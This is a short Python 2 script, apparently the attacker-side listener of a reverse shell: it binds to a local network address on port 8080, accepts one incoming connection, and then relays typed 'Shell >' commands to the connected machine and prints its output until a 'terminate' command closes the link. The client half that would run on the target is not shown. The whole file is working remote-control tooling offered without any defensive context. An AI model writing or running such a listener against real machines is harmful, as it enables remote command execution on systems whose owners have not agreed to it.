import socket

def connect():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('192.168.233.128', 8080))
    s.listen(1)
    conn, addr = s.accept()
    print '[+] Connection from ' + str(addr)


    while True:

        command = raw_input("Shell > " )

        if 'terminate' in command:
            #Send terminate signal to the client
            conn.send('terminate')
            #Close the connection to the client on the server end
            conn.close()
            break

        else:
            conn.send(command)
            print conn.recv(1024)

def main():
    connect()


if __name__ == '__main__':
    main()
